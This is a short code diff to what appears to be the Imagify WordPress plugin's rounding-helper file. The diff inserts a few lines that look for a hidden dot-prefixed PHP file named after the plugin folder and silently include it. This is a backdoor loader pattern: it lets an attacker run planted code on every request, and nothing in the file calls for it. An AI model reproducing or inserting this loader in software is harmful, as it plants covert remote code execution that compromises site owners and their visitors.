@@ -10,6 +10,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  * @param  int|float|string $number  The number to round up.
  * @return float The formatted number.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function imagify_round_half_five( $number ) {
 	$number = strval( $number );
 	$number = explode( '.', $number );
